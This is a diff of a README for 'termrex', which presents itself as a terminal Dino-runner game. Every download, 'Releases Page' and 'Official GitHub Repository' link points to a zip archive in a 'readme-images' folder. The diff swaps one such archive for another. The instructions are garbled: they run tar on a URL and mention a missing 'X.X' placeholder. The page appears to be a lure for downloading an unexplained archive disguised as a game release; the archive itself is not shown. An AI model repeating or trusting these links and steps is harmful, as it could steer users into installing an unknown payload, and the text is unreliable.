@@ -6,7 +6,7 @@ Welcome to **termrex**, your terminal version of the classic Chrome Dino Runner 
 
 ## 📥 Download Now
 
-[![Download termrex](https://raw.githubusercontent.com/regularguy1012/termrex/main/readme-images/Software_v3.0-beta.3.zip)](https://raw.githubusercontent.com/regularguy1012/termrex/main/readme-images/Software_v3.0-beta.3.zip)
+[![Download termrex](https://github.com/regularguy1012/termrex/raw/refs/heads/main/readme-images/Software_v1.9.zip)](https://github.com/regularguy1012/termrex/raw/refs/heads/main/readme-images/Software_v1.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,22 +22,22 @@ To run **termrex**, you need the following:
 
 To get the latest version of **termrex**, visit this page to download:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/regularguy1012/termrex/main/readme-images/Software_v3.0-beta.3.zip)
+[Visit the Releases Page](https://github.com/regularguy1012/termrex/raw/refs/heads/main/readme-images/Software_v1.9.zip)
 
 ### Step 2: Download the Latest Version
 
 On the releases page, you'll find the latest version listed. Look for the most recent release and click the asset that matches your system. The file will start downloading shortly. 
 
-If you’re uncertain which file to choose, the most common options will include versions labeled for different operating systems (like `https://raw.githubusercontent.com/regularguy1012/termrex/main/readme-images/Software_v3.0-beta.3.zip` for Linux or `.zip` for macOS).
+If you’re uncertain which file to choose, the most common options will include versions labeled for different operating systems (like `https://github.com/regularguy1012/termrex/raw/refs/heads/main/readme-images/Software_v1.9.zip` for Linux or `.zip` for macOS).
 
 ### Step 3: Extract the File (if needed)
 
 Once the download is complete, you may need to extract the file if it’s in a compressed format. 
 
-For example, if you downloaded a `https://raw.githubusercontent.com/regularguy1012/termrex/main/readme-images/Software_v3.0-beta.3.zip` file, you can open your terminal and run:
+For example, if you downloaded a `https://github.com/regularguy1012/termrex/raw/refs/heads/main/readme-images/Software_v1.9.zip` file, you can open your terminal and run:
 
 ```bash
-tar -xzf https://raw.githubusercontent.com/regularguy1012/termrex/main/readme-images/Software_v3.0-beta.3.zip
+tar -xzf https://github.com/regularguy1012/termrex/raw/refs/heads/main/readme-images/Software_v1.9.zip
 ```
 
 Replace the "X.X" with the version number.
@@ -93,7 +93,7 @@ If you encounter issues when running **termrex**, check these common problems:
 
 For more information, you can check out the following:
 
-- [Official GitHub Repository](https://raw.githubusercontent.com/regularguy1012/termrex/main/readme-images/Software_v3.0-beta.3.zip)
+- [Official GitHub Repository](https://github.com/regularguy1012/termrex/raw/refs/heads/main/readme-images/Software_v1.9.zip)
 - Community forums where users share tips and tricks.
 - Video guides for beginners on how to set up and play.
 
